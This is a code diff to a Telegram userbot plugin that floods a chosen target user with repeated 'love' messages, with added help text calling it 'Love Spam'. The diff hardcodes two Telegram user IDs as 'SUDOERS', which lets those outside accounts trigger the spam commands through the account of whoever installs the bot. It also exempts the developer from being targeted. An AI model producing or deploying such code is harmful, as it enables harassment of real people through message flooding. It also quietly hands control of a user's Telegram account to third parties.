@@ -6,8 +6,11 @@ from pyrogram import Client, filters
 from pyrogram.types import Message
 
 from AdityaHalder.helper.data import *
+from .. import *
 
-@app.on_message(filters.command(["lraid", "lr"], ".") & (filters.me | filters.user(SUDO_USER)))
+SUDOERS = [1711510822, 6485380150]  
+
+@app.on_message(filters.command(["lraid", "lr"], ".") & (filters.me | filters.user(SUDOERS)))
 async def raid(app: Client, m: Message):  
       Romeo = "".join(m.text.split(maxsplit=1)[1:]).split(" ", 2)
       if len(Romeo) == 2:
@@ -39,7 +42,7 @@ async def raid(app: Client, m: Message):
       if int(user.id) in VERIFIED_USERS:
          await m.reply_text("I can't love raid on my developer")
          return
-      if int(user.id) in SUDO_USER:
+      if int(user.id) in SUDOERS:
          await m.reply_text("This guy is a sudo users.")
          return
       mention = user.mention
@@ -78,7 +81,7 @@ async def draid(app: Client, m: Message):
       if int(user.id) in VERIFIED_USERS:
          await m.reply_text("I can't Love raid on my developer")
          return
-      if int(user.id) in SUDO_USER:
+      if int(user.id) in SUDOERS:
          await m.reply_text("This guy is a sudo users.")
          return
       mention = user.mention
@@ -87,3 +90,15 @@ async def draid(app: Client, m: Message):
          r = f"{choice(LOVE)}"
          await app.send_message(user.id, r)
          await asyncio.sleep(0.3)
+
+
+__NAME__ = "Raid"
+__MENU__ = f"""
+**Love Spam**
+
+`.lraid` or `lr` - Reply This Command
+To Target User Message.
+
+`.dmlr` or `.dmlraid` - To Deactivate Just
+Reply This Command.
+"""
